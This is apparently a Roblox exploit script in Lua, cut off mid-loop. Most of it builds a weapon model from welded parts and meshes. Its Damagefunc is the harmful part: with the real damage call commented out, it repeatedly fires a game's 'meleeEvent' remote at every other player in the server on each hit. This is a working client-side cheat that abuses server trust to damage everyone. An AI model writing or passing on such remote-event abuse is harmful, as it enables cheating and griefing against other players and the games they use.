Hitbox=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","Hitbox",Vector3.new(0.273318797, 4.06367111, 0.650520384))
Hitboxweld=weld(m,handle,Hitbox,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-1.90734863e-006, 6.34182358, -0.000163793564, 5.65841162e-007, 3.16612329e-007, 0.999996066, -3.4916394e-007, -0.999998033, 3.16614091e-007, 0.999998033, -3.49163827e-007, -5.65839969e-007))
mesh("BlockMesh",Hitbox,"","",Vector3.new(0, 0, 0),Vector3.new(0.595019877, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.650520384, 0.325260222, 0.650520384))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.487652063, 0, -3.49754333, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Lime green","Part",Vector3.new(0.325260222, 0.273318827, 0.34152317))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-3.81469727e-006, -2.92838097, 0, 0.999997139, 0, 0, 0, 0.999997139, 0, 0, 0, 1))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 0.595019877, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.330000013, 0.626189232, 0.300000012))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.0023651123, 2.37741184, 0.175241947, -1.17832087e-007, 8.94067682e-008, -0.999998212, -1.17250796e-008, -0.999998212, -2.98022531e-008, -0.999997675, 1.17250742e-008, -6.09815629e-008))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.325260222, 1.62630117, 0.325260192))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(9.53674316e-007, 1.87019825, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.273318797, 0.813150585, 0.325260192))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-2.31991673, -2.22977638, 0, 0.86602509, 0.499999791, 0, -0.499999791, 0.86602509, 0, 0, 0, 1))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.595019877, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.330000013, 1.4261893, 0.319999993))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00238227844, -5.02258682, 0.165237427, -2.84253847e-008, 2.98023224e-008, -0.999999404, -1.17251009e-008, -0.999999762, -8.94069672e-008, -0.999999821, 1.17250964e-008, 2.84253776e-008))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Lime green","Part",Vector3.new(0.330000013, 0.82618922, 0.319999993))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.00238418579, -4.72257996, 0.154758215, 4.47034658e-008, 8.94069103e-008, 0.999998212, 1.17250885e-008, -0.999999285, 2.98022123e-008, 0.999999106, 1.17250964e-008, 4.47034267e-008))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.273318797, 0.813150585, 0.325260192))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.732203484, -3.90410805, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.595019877, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.273318797, 1.46367109, 0.650520384))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-1.90734863e-006, 5.04182816, -0.000163316727, 5.65841162e-007, 3.16612329e-007, 0.999996066, -3.4916394e-007, -0.999998033, 3.16614091e-007, 0.999998033, -3.49163827e-007, -5.65839969e-007))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.595019877, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.325260222, 0.273318827, 0.325260192))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(9.53674316e-007, 0.325282097, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 0.595019877, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.325260222, 0.273318827, 0.325260192))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(9.53674316e-007, -0.32526207, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 0.595019877, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Lime green","Part",Vector3.new(0.325260222, 0.273318827, 0.325260192))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(9.53674316e-007, 0.487874031, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 0.595019877, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.325260222, 1.62630117, 0.325260192))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(9.53674316e-007, -1.87132168, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.650520384, 0.325260222, 0.650520384))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.487545967, 0, -3.49754333, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Light stone grey","Part",Vector3.new(0.273318797, 1.46367109, 0.325260222))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-1.90734863e-006, 5.04182816, -0.000163316727, 5.65841162e-007, 3.16612329e-007, 0.999996066, -3.4916394e-007, -0.999998033, 3.16614091e-007, 0.999998033, -3.49163827e-007, -5.65839969e-007))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.654521883, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Lime green","Part",Vector3.new(0.65047574, 0.341500849, 0.32523787))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(9.53674316e-007, 9.53674316e-006, 3.33380222, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.650520384, 1.62630117, 0.325260192))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(9.53674316e-007, -3.49754333, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Lime green","Part",Vector3.new(0.325260222, 0.325260222, 0.325260192))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(9.53674316e-007, 0.894457817, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Lime green","Part",Vector3.new(0.65047574, 0.341500849, 0.273318797))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(9.53674316e-007, 9.53674316e-006, 2.92722988, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 0.595019877))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.325260222, 0.273318827, 0.325260192))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(9.53674316e-007, -0.650509834, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 0.595019877, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Lime green","Part",Vector3.new(0.975780606, 0.273318827, 0.34152317))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.49758148, -3.81469727e-006, 0, -2.98023224e-008, -0.999999821, 0, 0.999999821, -2.98023224e-008, 0, 0, 0, 1))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 0.595019877, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Lime green","Part",Vector3.new(0.650520384, 0.3415232, 0.325260192))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.487652063, 0, -3.49754333, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.273318797, 0.813150585, 0.325260192))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.732181072, -3.90410805, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.595019877, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.325260222, 0.273318827, 0.325260192))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(9.53674316e-007, 0.650484085, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 0.595019877, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Lime green","Part",Vector3.new(0.65047574, 0.341500849, 0.487856805))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(9.53674316e-007, 9.53674316e-006, 3.90297031, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Lime green","Part",Vector3.new(0.325260222, 0.273318827, 0.3415232))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-3.81469727e-006, -4.06662655, 0, 0.999996424, 0, 0, 0, 0.999996424, 0, 0, 0, 1))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 0.595019877, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.273318797, 0.813150585, 0.325260192))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.31982613, -2.22982979, 0, 0.866025329, -0.5, 0, 0.5, 0.866025329, 0, 0, 0, 1))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(0.595019877, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.65047574, 1.62618923, 0.32523784))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(2.38418579e-007, 3.49640274, 0, 0.999998569, 6.21724894e-015, 8.94068108e-008, 8.8817842e-016, 0.999999046, 6.4472997e-014, 8.94068819e-008, -2.07921296e-014, 0.999997616))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.330000013, 0.626189232, 0.349999994))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.00236701965, 2.3774128, 0.149743199, 4.47034409e-008, 8.94066972e-008, 0.999997914, 1.17250671e-008, -0.999997616, 2.98022478e-008, 0.999996722, 1.17250654e-008, 1.34110451e-007))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Lime green","Part",Vector3.new(0.650520384, 0.34152323, 0.325260192))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.487545967, 0, -3.49754333, 1, 0, 0, 0, 0, -1, 0, 1, 0))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Lime green","Part",Vector3.new(0.325260222, 0.325260222, 0.325260192))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(9.53674316e-007, -0.894445419, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Lime green","Part",Vector3.new(0.325260222, 0.273318827, 0.325260192))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(9.53674316e-007, -0.487901688, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1))
mesh("CylinderMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 0.595019877, 1))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Lime green","Wedge",Vector3.new(0.325260192, 0.325260222, 0.273318797))
Wedgeweld=weld(m,handle,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0, -0.487545967, 3.41505909, 4.92214713e-010, 0, -0.999999642, -1, -2.45083971e-008, -4.92215435e-010, -1.97962411e-008, 0.999999642, 0))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 0.595019877))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Wedge",Vector3.new(0.273318797, 2.60208178, 0.325260192))
Wedgeweld=weld(m,handle,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.81469727e-006, -7.07472134, 0.162785649, 0, -5.41302938e-007, -0.999998033, 2.9919542e-007, 0.999998808, -5.71104749e-007, 0.999997318, -2.99195932e-007, -7.4505806e-008))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.595019877, 1, 1))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Wedge",Vector3.new(0.325260192, 0.650520444, 0.325260192))
Wedgeweld=weld(m,handle,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0, 2.35806179, 0.162777185, -5.96044885e-008, 8.8817842e-016, -0.99999851, 0, 0.999998808, 3.55270944e-015, 0.999997318, 0, -5.96045737e-008))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Lime green","Wedge",Vector3.new(0.325260192, 0.325260222, 0.273318797))
Wedgeweld=weld(m,handle,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0, -0.487545967, 2.92715549, 4.92214713e-010, 0, -0.999999642, -1, -2.45083971e-008, -4.92215435e-010, -1.97962411e-008, 0.999999642, 0))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 0.595019877))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Wedge",Vector3.new(0.325260192, 0.487890393, 0.273318797))
Wedgeweld=weld(m,handle,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0, -0.569425941, -2.76451397, -2.41811932e-010, -5.640171e-009, 1, -1, 2.98023224e-008, -2.41810849e-010, -3.45144855e-008, -1, -5.640171e-009))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 0.595019877))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Wedge",Vector3.new(0.325260192, 0.487890393, 0.273318797))
Wedgeweld=weld(m,handle,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0, -0.569425821, -3.74025059, -2.41811932e-010, -5.640171e-009, 1, -1, 2.98023224e-008, -2.41810849e-010, -3.45144855e-008, -1, -5.640171e-009))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 0.595019877))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Light stone grey","Wedge",Vector3.new(0.273318797, 2.27682185, 0.273318797))
Wedgeweld=weld(m,handle,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(3.81469727e-006, -6.91205883, 0.0809696913, 0, -5.41302938e-007, -0.999998033, 2.9919542e-007, 0.999998808, -5.71104749e-007, 0.999997318, -2.99195932e-007, -7.4505806e-008))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.654521883, 1, 0.595019877))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Wedge",Vector3.new(0.325260192, 0.650520444, 0.325260192))
Wedgeweld=weld(m,handle,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0, 2.35809898, 0.162807703, 1.65436123e-024, -3.98708368e-017, 0.999998331, 0, 0.999998808, 3.9872726e-017, -0.999997318, -0, -1.49011612e-008))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Lime green","Wedge",Vector3.new(0.325260192, 0.325260222, 0.273318797))
Wedgeweld=weld(m,handle,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0, -0.487545967, 3.90288067, 4.92214713e-010, 0, -0.999999642, -1, -2.45083971e-008, -4.92215435e-010, -1.97962411e-008, 0.999999642, 0))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 0.595019877))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Wedge",Vector3.new(0.273318797, 1.62630105, 0.325260192))
Wedgeweld=weld(m,handle,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0, -6.5868082, 0.162807941, 2.45382346e-008, 1.42210678e-017, 0.999998331, -8.34963032e-009, 0.999998808, -2.98023224e-008, -0.999997318, -8.34964098e-009, 2.45382541e-008))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.595019877, 1, 1))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Wedge",Vector3.new(0.325260192, 0.487890393, 0.273318797))
Wedgeweld=weld(m,handle,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0, -0.569425821, -3.25242233, -2.41811932e-010, -5.640171e-009, 1, -1, 2.98023224e-008, -2.41810849e-010, -3.45144855e-008, -1, -5.640171e-009))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 0.595019877))
Wedge=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Light stone grey","Wedge",Vector3.new(0.273318797, 1.30104089, 0.273318797))
Wedgeweld=weld(m,handle,Wedge,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0, -6.4241457, 0.0810163021, 2.45382346e-008, 1.42210678e-017, 0.999998331, -8.34963032e-009, 0.999998808, -2.98023224e-008, -0.999997318, -8.34964098e-009, 2.45382541e-008))
mesh("SpecialMesh",Wedge,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.654521883, 1, 0.595019877))

Damagefunc=function(hit,minim,maxim,knockback,Type,Property,Delay,KnockbackType,decreaseblock)
        if hit.Parent==nil then
                return
        end
        h=hit.Parent:FindFirstChild("Humanoid")
        for _,v in pairs(hit.Parent:children()) do
        if v:IsA("Humanoid") then
        h=v
        end
        end
        if hit.Parent.Parent:FindFirstChild("Torso")~=nil then
        h=hit.Parent.Parent:FindFirstChild("Humanoid")
        end
        if hit.Parent.className=="Hat" then
        hit=hit.Parent.Parent:findFirstChild("Head")
        end
        if h~=nil and hit.Parent.Name~=Character.Name and hit.Parent:FindFirstChild("Torso")~=nil then
        if hit.Parent:findFirstChild("DebounceHit")~=nil then if hit.Parent.DebounceHit.Value==true then return end end
        --[[                if game.Players:GetPlayerFromCharacter(hit.Parent)~=nil then
                        return
                end]]
--                        hs(hit,1.2) 
                        c=Instance.new("ObjectValue")
                        c.Name="creator"
                        c.Value=game:service("Players").LocalPlayer
                        c.Parent=h
                        game:GetService("Debris"):AddItem(c,.5)
                Damage=math.random(minim,maxim)
		  spawn(function()
                            for i, plr in pairs(game.Players:GetChildren()) do
                                if plr.Name ~= game.Players.LocalPlayer.Name then
                                    for i = 1, 10 do
                                        game.ReplicatedStorage.meleeEvent:FireServer(plr)
                                    end
                                end
                            end
                  end)
--                h:TakeDamage(Damage)
                blocked=false
                block=hit.Parent:findFirstChild("Block")
                if block~=nil then
                print(block.className)
                if block.className=="NumberValue" then
                if block.Value>0 then
                blocked=true
                if decreaseblock==nil then
                block.Value=block.Value-1
                end
                end
                end
                if block.className=="IntValue" then
                if block.Value>0 then
                blocked=true
                if decreaseblock~=nil then
                block.Value=block.Value-1
                end
                end
                end
                end
                if blocked==false then
		spawn(function()
                            for i, plr in pairs(game.Players:GetChildren()) do
                                if plr.Name ~= game.Players.LocalPlayer.Name then
                                    for i = 1, 10 do
                                        game.ReplicatedStorage.meleeEvent:FireServer(plr)
                                    end
                                end
                            end
                  end)
--                h:TakeDamage(Damage)
                showDamage(hit.Parent,Damage,.5,BrickColor.new("Neon green"))
                else
		spawn(function()
                            for i, plr in pairs(game.Players:GetChildren()) do
                                if plr.Name ~= game.Players.LocalPlayer.Name then
                                    for i = 1, 10 do
                                        game.ReplicatedStorage.meleeEvent:FireServer(plr)
                                    end
                                end
                            end
                  end)
                showDamage(hit.Parent,Damage/2,.5,BrickColor.new("Bright blue"))
                end
                if Type=="Knockdown" then
                hum=hit.Parent.Humanoid
hum.PlatformStand=true
coroutine.resume(coroutine.create(function(HHumanoid)
swait(1)
HHumanoid.PlatformStand=false
end),hum)
                local angle=(hit.Position-(Property.Position+Vector3.new(0,0,0))).unit
--hit.CFrame=CFrame.new(hit.Position,Vector3.new(angle.x,hit.Position.y,angle.z))*CFrame.fromEulerAnglesXYZ(math.pi/4,0,0)
local bodvol=Instance.new("BodyVelocity")
bodvol.velocity=angle*knockback
bodvol.P=5000
bodvol.maxForce=Vector3.new(8e+003, 8e+003, 8e+003)
bodvol.Parent=hit
rl=Instance.new("BodyAngularVelocity")
rl.P=3000
rl.maxTorque=Vector3.new(500000,500000,500000)*50000000000000
rl.angularvelocity=Vector3.new(math.random(-10,10),math.random(-10,10),math.random(-10,10))
rl.Parent=hit
game:GetService("Debris"):AddItem(bodvol,.5)
game:GetService("Debris"):AddItem(rl,.5)
                elseif Type=="Normal" then
                vp=Instance.new("BodyVelocity")
                vp.P=500
                vp.maxForce=Vector3.new(math.huge,0,math.huge)
--                vp.velocity=Character.Torso.CFrame.lookVector*Knockback
                if KnockbackType==1 then
                vp.velocity=Property.CFrame.lookVector*knockback+Property.Velocity/1.05
                elseif KnockbackType==2 then
                vp.velocity=Property.CFrame.lookVector*knockback
                end
                if knockback>0 then
                        vp.Parent=hit.Parent.Torso
                end
                game:GetService("Debris"):AddItem(vp,.5)
                elseif Type=="Up" then
                local bodyVelocity=Instance.new("BodyVelocity")
                bodyVelocity.velocity=vt(0,60,0)
                bodyVelocity.P=5000
                bodyVelocity.maxForce=Vector3.new(8e+003, 8e+003, 8e+003)
                bodyVelocity.Parent=hit
                game:GetService("Debris"):AddItem(bodyVelocity,1)
                rl=Instance.new("BodyAngularVelocity")
                rl.P=3000
                rl.maxTorque=Vector3.new(500000,500000,500000)*50000000000000
                rl.angularvelocity=Vector3.new(math.random(-30,30),math.random(-30,30),math.random(-30,30))
                rl.Parent=hit
                game:GetService("Debris"):AddItem(rl,.5)
                elseif Type=="Snare" then
                bp=Instance.new("BodyPosition")
                bp.P=2000
                bp.D=100
                bp.maxForce=Vector3.new(math.huge,math.huge,math.huge)
                bp.position=hit.Parent.Torso.Position
                bp.Parent=hit.Parent.Torso
                game:GetService("Debris"):AddItem(bp,1)
                elseif Type=="Target" then
                if Targetting==false then
                ZTarget=hit.Parent.Torso
                coroutine.resume(coroutine.create(function(Part) 
                so("http://www.roblox.com/asset/?id=15666462",Part,1,1.5) 
                swait(5)
                so("http://www.roblox.com/asset/?id=15666462",Part,1,1.5) 
                end),ZTarget)
                TargHum=ZTarget.Parent:findFirstChild("Humanoid")
                targetgui=Instance.new("BillboardGui")
                targetgui.Parent=ZTarget
                targetgui.Size=UDim2.new(10,100,10,100)
                targ=Instance.new("ImageLabel")
                targ.Parent=targetgui
                targ.BackgroundTransparency=1
                targ.Image="rbxassetid://4834067"
                targ.Size=UDim2.new(1,0,1,0)
                cam.CameraType="Scriptable"
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                dir=Vector3.new(cam.CoordinateFrame.lookVector.x,0,cam.CoordinateFrame.lookVector.z)
                workspace.CurrentCamera.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                Targetting=true
                RocketTarget=ZTarget
                for i=1,Property do
